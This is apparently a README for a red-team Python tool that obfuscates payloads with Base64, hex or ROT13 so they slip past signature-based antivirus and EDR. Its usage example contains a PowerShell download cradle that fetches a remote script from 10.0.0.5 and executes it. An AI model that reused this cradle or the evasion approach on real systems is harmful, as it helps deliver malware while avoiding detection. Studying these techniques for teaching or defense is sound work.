# 🥷 Payload Obfuscator Toolkit

![Red Team](https://img.shields.io/badge/Red_Team-Evasion-red?style=for-the-badge)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)

## 📌 Executive Summary
During a Red Team engagement, delivering a payload to a target is only half the battle; ensuring the payload executes without being blocked by Antivirus (AV) or Endpoint Detection and Response (EDR) is critical. 

This toolkit is a Python-based utility designed to demonstrate fundamental **Defense Evasion** techniques (MITRE ATT&CK **TA0005**). It takes a raw command or script and obfuscates it using Base64, Hexadecimal, or ROT13 encoding.

## 🧠 The Technique
Security tools often rely on static signatures (specific strings of text) to detect malicious activity. By encoding a payload, we change its signature, allowing it to bypass naive signature-based detection. 

1. **Base64:** Converts the payload into a string of characters. In PowerShell, the `-enc` flag can execute this directly.
2. **Hexadecimal:** Converts the payload into `\x` bytes, commonly used when injecting shellcode into memory.
3. **ROT13:** A simple letter substitution cipher, useful for bypassing basic string-matching rules.

## 🚀 Usage
1. Clone the repository.
2. Run the script with your raw command:

**Base64 Encoding (PowerShell):**
```bash
python obfuscator.py -p "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')" -t base64
